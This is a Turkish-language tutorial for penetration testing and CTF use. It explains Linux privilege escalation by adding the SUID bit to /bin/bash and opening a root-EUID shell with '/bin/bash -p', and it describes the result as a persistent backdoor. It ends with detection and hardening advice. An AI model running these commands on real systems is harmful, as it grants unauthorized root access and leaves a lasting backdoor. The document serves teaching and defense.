# SUID Bash ile Privilege Escalation (`/bin/bash -p`)

> ⚠️ **Uyarı:** Bu içerik yalnızca **yetkili sızma testleri, CTF yarışmaları ve eğitim amaçlı** kullanım içindir. İzinsiz sistemlerde kullanmak yasa dışıdır.

## Özet

Bir sistemde `/bin/bash` dosyasına **SUID biti** ekleyebilecek yetkimiz varsa (örneğin `sudo` ile `chmod` çalıştırabiliyorsak), `/bin/bash -p` komutuyla **root** yetkilerine sahip bir shell elde edebiliriz.

```bash
chmod +s /bin/bash      # bash'e setuid biti ekle (root olarak)
/bin/bash -p            # root yetkisini koruyarak shell aç
```

---

## SUID Biti Nedir?

**SUID (Set User ID)**, bir çalıştırılabilir dosyaya eklenen özel bir izin bitidir. Bir dosyada SUID biti aktifse, o dosya **çalıştıran kullanıcının değil, dosyanın sahibinin** yetkileriyle çalışır.

`/bin/bash` dosyasının sahibi `root` olduğundan, SUID biti eklendiğinde bash root yetkileriyle başlatılır.

```bash
# SUID biti eklendikten sonra:
ls -l /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
#     ↑
#     's' harfi SUID bitinin aktif olduğunu gösterir
```

---

## `-p` Parametresinin Anlamı

`/bin/bash -p` komutundaki `-p` parametresi, bash'in **"privileged" (ayrıcalıklı) modda** çalışmasını sağlar.

| Durum | Davranış |
|-------|----------|
| **`-p` olmadan** | Bir SUID/SGID program çalıştırıldığında, bash güvenlik nedeniyle **efektif kullanıcı ID'sini (EUID)** gerçek kullanıcı ID'sine (RUID) düşürür. |
| **`-p` ile** | Bash bu güvenlik önlemini devre dışı bırakır ve **efektif kullanıcı ID'sini (root) korur.** |

Yani:
- **`-p` olmazsa** → bash root yetkisini düşürür, normal kullanıcı kalırsın.
- **`-p` ile** → bash root yetkisini korur, tam yetkili root shell elde edersin.

---

## Senaryo Adımları

1. **SUID bitini ekle** (root yetkisi gerektirir — örn. yanlış yapılandırılmış `sudo`):
   ```bash
   chmod +s /bin/bash
   ```

2. Artık `/bin/bash` dosyası **root yetkileriyle** çalışır hale gelir.

3. **Ayrıcalıklı shell aç:**
   ```bash
   /bin/bash -p
   ```

4. **Doğrula:**
   ```bash
   id
   # uid=1000(user) gid=1000(user) euid=0(root) ...
   whoami
   # root  (bazı komutlar euid'e göre çalışır)
   ```

> **Not:** `id` çıktısında `uid` normal kullanıcıyı gösterse de **`euid=0(root)`** olması yeterlidir. Root'a ait dosyaları okuyabilir, yazabilir ve root komutları çalıştırabilirsin.

---

## Neden Sistem Yeniden Başlatıldıktan Sonra da Çalışır?

SUID biti **dosya sistemi üzerinde kalıcı bir izindir**. Yani `chmod +s` ile eklenen bit, sistem yeniden başlatılsa bile silinmez. Bu yüzden bir kez SUID biti eklendiğinde, `/bin/bash -p` kalıcı bir **backdoor** (arka kapı) haline gelir — dosya izni değiştirilene veya bit kaldırılana kadar.

```bash
# Biti kaldırmak için (savunma tarafı):
chmod -s /bin/bash
```

---

## Savunma / Tespit (Blue Team)

Sistemdeki tüm SUID dosyalarını taramak için:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/bin/bash`, `/bin/dash` gibi kabukların bu listede çıkması **ciddi bir güvenlik açığı** işaretidir ve derhal düzeltilmelidir.

### Önlemler
- Kullanıcılara `chmod`, `chown` gibi komutları `sudo` üzerinden **kısıtlamadan** vermeyin.
- SUID dosyalarını düzenli olarak denetleyin (audit).
- Dosya bütünlüğü izleme araçları (AIDE, Tripwire) kullanın.

---

## İlgili Kaynaklar

- [GTFOBins - bash](https://gtfobins.github.io/gtfobins/bash/)
- `man bash` → `-p` bölümü
- Linux Privilege Escalation - SUID Binaries
